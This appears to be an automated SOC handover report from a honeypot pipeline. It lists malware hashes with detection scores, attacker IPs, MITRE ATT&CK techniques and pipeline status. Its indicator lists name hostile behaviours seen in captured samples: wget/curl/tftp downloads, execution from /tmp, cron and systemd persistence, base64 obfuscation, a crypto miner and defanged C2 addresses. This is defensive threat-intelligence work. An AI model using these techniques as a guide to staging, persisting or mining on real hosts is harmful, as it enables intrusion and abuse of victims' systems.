| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0de787cffbec4dcc42e0ecd9491795c7dfe8fe4a955cb67a87544d5c36070982` | ELF Binary (Linux executable) (x86-64 64-bit) | `0de787cffbec4dcc...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `19e78c00d07f011fcb708ffb12f8dd2fd0f1e57faaf21129b53c7f68ae611e60` | ELF Binary (Linux executable) (x86-64 64-bit) | `19e78c00d07f011f...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ec20680994f17b88492809aa5d135fb463c04ec5868639c5515126e2149a240` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ec20680994f17b8...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `38.110.46[.]238` | US | Georgia Institute of Technology | **100** ⚠️ | 0 |
| `165.154.225[.]20` | HK | Scloud Pte Ltd t/a Scloud Pte Ltd | **100** ⚠️ | 50 |
| `2.57.122[.]209` | RO | TECHOFF SRV LIMITED | **100** ⚠️ | 50 |
| `128.201.9[.]177` | BR | NEXT FIBRA | **100** ⚠️ | 1 |
| `85.217.149[.]41` | CA | Modat B.V. | **100** ⚠️ | 50 |
| `144.22.238[.]238` | BR | Oracle Corporation | **100** ⚠️ | 4 |
| `20.42.59[.]55` | US | Microsoft Corporation | **100** ⚠️ | 11 |
| `195.178.110[.]217` | NL | TECHOFF SRV LIMITED | **100** ⚠️ | 50 |
| `185.226.197[.]39` | NL | ICG-4-ZEN-AMS | **100** ⚠️ | 50 |
| `66.240.223[.]240` | US | CariNet, Inc. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 199 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 192 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 82 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 44 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 43 |

---

## 🔕 False Positive Summary (76 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 23 |
| AbuseIPDB score 1 below threshold 25 | 7 |
| AbuseIPDB score 11 below threshold 25 | 1 |
| AbuseIPDB score 12 below threshold 25 | 3 |
| AbuseIPDB score 16 below threshold 25 | 4 |
| AbuseIPDB score 17 below threshold 25 | 5 |
| AbuseIPDB score 21 below threshold 25 | 6 |
| AbuseIPDB score 22 below threshold 25 | 1 |
| AbuseIPDB score 23 below threshold 25 | 6 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 20 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 376 cases |
| Tool 34  | Credential Extractor        | ✅ 1059 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 31 fingerprints |
| Tool 36  | Command Clustering          | ✅ 59 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 223 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 76 filtered (20.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 106 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 38 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 177 priority case(s) shown individually · 121 recon entry/entries in table (2 group(s) consolidating 4 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-11-09T21:48:47Z_
